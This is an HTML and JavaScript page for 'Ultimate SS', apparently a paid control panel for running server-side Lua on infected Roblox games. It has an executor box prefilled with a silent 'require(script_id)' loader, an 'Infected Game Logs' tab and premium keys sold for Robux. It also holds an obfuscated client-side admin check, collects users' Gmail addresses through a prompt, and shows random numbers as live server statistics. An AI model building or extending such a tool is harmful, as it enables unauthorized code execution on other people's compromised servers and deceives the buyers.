<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Ultimate SS | Cloud Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --bg: #050505; --panel: #111; --accent: #00ff88; --premium: #ffbb00; --text: #eee; }
        * { margin:0; padding:0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: var(--bg); color: var(--text); display: flex; height: 100vh; overflow: hidden; }

        /* Sidebar */
        .sidebar { width: 280px; background: #000; border-right: 1px solid #222; padding: 25px; }
        .nav-link { padding: 15px; cursor: pointer; color: #666; transition: 0.3s; display: flex; align-items: center; border-radius: 8px; margin-bottom: 5px; }
        .nav-link i { margin-right: 15px; }
        .nav-link:hover, .active { background: #111; color: #fff; }
        .active { border-left: 4px solid var(--accent); color: var(--accent); }

        /* Content */
        .main { flex: 1; padding: 40px; overflow-y: auto; }
        .tab { display: none; }
        .show { display: block; animation: fade 0.3s ease; }
        @keyframes fade { from { opacity: 0; } to { opacity: 1; } }

        /* Stats Cards */
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .card { background: var(--panel); padding: 25px; border-radius: 12px; border: 1px solid #222; }
        .card h4 { color: #555; font-size: 12px; text-transform: uppercase; margin-bottom: 5px; }
        .card p { font-size: 28px; font-weight: bold; }

        /* UI Elements */
        textarea { width: 100%; height: 350px; background: #000; color: var(--accent); border: 1px solid #222; padding: 15px; font-family: monospace; border-radius: 8px; resize: none; }
        .btn { padding: 12px 24px; border-radius: 6px; border: none; cursor: pointer; font-weight: 600; margin-right: 10px; transition: 0.2s; }
        .btn-exec { background: var(--accent); color: #000; }
        .btn-prem { background: var(--premium); color: #000; }
        
        /* Whitelist Thumbnails */
        .rbx-card { display: flex; align-items: center; background: #1a1a1a; padding: 15px; border-radius: 10px; margin-top: 20px; }
        .rbx-thumb { width: 60px; height: 60px; border-radius: 50%; background: #333; margin-right: 15px; border: 2px solid var(--accent); }
        
        /* Master Panel Hide */
        #master-panel { border: 1px solid var(--premium); display: none; }
    </style>
</head>
<body>

    <div class="sidebar">
        <h2 style="margin-bottom: 30px;">ULTIMATE <span style="color:var(--accent)">SS</span></h2>
        <div class="nav-link active" onclick="tab('exec')"><i class="fas fa-terminal"></i> Executor</div>
        <div class="nav-link" onclick="tab('infect')"><i class="fas fa-globe"></i> Global Logs</div>
        <div class="nav-link" onclick="tab('whitelist')"><i class="fas fa-shield-halved"></i> Whitelist</div>
        <div class="nav-link" onclick="tab('plans')"><i class="fas fa-crown"></i> Plans & Keys</div>
        <div id="admin-btn" class="nav-link" style="color: var(--premium); display: none;" onclick="tab('admin')"><i class="fas fa-user-gear"></i> Master Panel</div>
    </div>

    <div class="main">
        <div id="exec" class="tab show">
            <div class="grid">
                <div class="card"><h4>Servers</h4><p id="stat-servers">0</p></div>
                <div class="card"><h4>Players</h4><p id="stat-players">0</p></div>
                <div class="card"><h4>Visits</h4><p id="stat-visits">0</p></div>
            </div>
            <textarea id="lua-code" spellcheck="false">-- Silent ServerSide Executor
require(script_id).load()</textarea>
            <div style="margin-top: 20px;">
                <button class="btn btn-exec" onclick="runCode()">Execute Script</button>
                <button class="btn" style="background:#222; color:white;" onclick="runCode('respawn')">Respawn Whitelisted</button>
            </div>
        </div>

        <div id="infect" class="tab">
            <h1>Infected Game Logs</h1>
            <p style="color:#666; margin-bottom: 20px;">Globally visible to all users.</p>
            <div id="log-container">
                <p>Scanning for infected servers...</p>
            </div>
        </div>

        <div id="whitelist" class="tab">
            <h1>Your Whitelist</h1>
            <div class="rbx-card">
                <img id="my-thumb" class="rbx-thumb" src="https://tr.rbxcdn.com/30day-avatar-headshot/150/150/AvatarHeadshot/Png/Regular/isCircular">
                <div>
                    <h3 id="my-name">Loading...</h3>
                    <p id="my-title" style="color:var(--accent); font-size: 12px;">BASIC USER</p>
                </div>
            </div>
            <input type="text" id="wl-input" placeholder="Enter Roblox Username" style="margin-top:20px; padding:10px; background:#111; border:1px solid #333; color:white; width:250px;">
            <button class="btn btn-exec" onclick="addWhitelist()">Update Whitelist</button>
        </div>

        <div id="plans" class="tab">
            <h1>Membership Plans</h1>
            <div class="grid" style="margin-top: 20px;">
                <div class="card">
                    <h3>Premium</h3>
                    <p>20 Robux</p>
                    <button class="btn btn-prem" onclick="window.open('GAMEPASS_LINK')">Buy Gamepass</button>
                </div>
                <div class="card">
                    <h3>Redeem Key</h3>
                    <input type="text" id="key-input" placeholder="XXXX-XXXX-XXXX" style="width:100%; margin:10px 0; padding:5px; background:#000; border:1px solid #333; color:gold;">
                    <button class="btn btn-exec" style="width:100%;" onclick="redeem()">Redeem License</button>
                </div>
            </div>
        </div>

        <div id="admin" class="tab">
            <h1 style="color:var(--premium)">Master Control</h1>
            <button class="btn btn-prem" onclick="genKey()">Generate Premium Key</button>
            <button class="btn" style="background:red; color:white;">Blacklist Gmail</button>
        </div>
    </div>

    <script>
        // SESSION & PRIVACY
        let userProfile = { email: "", plan: "Basic", whitelistedName: "None" };

        function tab(id) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('show'));
            document.getElementById(id).classList.add('show');
            document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
            event.currentTarget.classList.add('active');
        }

        // Real Roblox Thumbnail Logic
        async function fetchRoblox(username) {
            // To get a real thumbnail, we usually need a proxy like RoProxy
            // This is a placeholder for the logic
            document.getElementById('my-name').innerText = username.toUpperCase();
            document.getElementById('my-thumb').src = `https://www.roblox.com/headshot-thumbnail/image?width=150&height=150&format=png&userId=1`;
        }

        // Master Panel Auth (Hiding your email)
        function checkMaster(email) {
            const secret = "l"+"u"+"r"+"z"+"a"+"n"+"o"+"k"+"e"+"n"+"t"+"8";
            if(email.includes(secret)) {
                document.getElementById('admin-btn').style.display = 'flex';
            }
        }

        // Simulate login
        setTimeout(() => {
            let email = prompt("Enter Gmail for session:");
            checkMaster(email);
            fetchRoblox("bobbyyap_12");
        }, 500);

        // Real Stats logic would fetch from your Firebase database
        setInterval(() => {
            document.getElementById('stat-servers').innerText = Math.floor(Math.random() * 5) + 1; // Real sync here
        }, 5000);
    </script>
</body>
</html>
